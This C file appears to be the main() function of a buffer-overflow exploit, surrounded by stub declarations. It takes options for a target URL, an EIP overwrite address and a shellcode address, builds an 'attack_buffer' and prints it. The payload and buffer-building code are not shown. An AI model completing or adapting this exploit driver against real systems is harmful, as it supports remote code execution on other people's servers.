
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct system_type {unsigned int eip_address; unsigned int shellcode_address; } ;
typedef int attack_buffer ;


 int STDOUT_FILENO ;
 size_t atoi (char*) ;
 int getopt (int,char**,char*) ;
 char* optarg ;
 int parse_url (char*,char*) ;
 int prepare_attack_buffer (char*,struct system_type*,char*) ;
 int sscanf (char*,char*,unsigned int*) ;
 struct system_type* systems ;
 int usage () ;
 int write (int ,char*,int) ;

int
main (int argc, char *argv[])
{
 char attack_buffer[2000];

 struct system_type *sysptr;
 char *url;
 char target[2048];
 unsigned int eip_address = 0, shellcode_address = 0;
 int ctr = 0;
 int nop_count;
 char *walk;
 int arg;


 if (argc < 3)
  usage ();


 while ((arg = getopt (argc, argv, "s:u:e:h:")) != -1){
  switch (arg){
   case 'h':
      sscanf (optarg, "%x", &shellcode_address);
      break;
   case 'e':
      sscanf (optarg, "%x", &eip_address);
      break;
   case 's':
      sysptr = &systems[atoi (optarg)];
      break;
   case 'u':
      url = optarg;
      parse_url (url, target);
      break;
   case '?':
   default :
      usage ();
  }
 }

 if (eip_address)
  sysptr->eip_address = eip_address;
 if (shellcode_address)
  sysptr->shellcode_address = shellcode_address;
 prepare_attack_buffer (attack_buffer, sysptr, url);


 write (STDOUT_FILENO, attack_buffer, sizeof (attack_buffer));
}
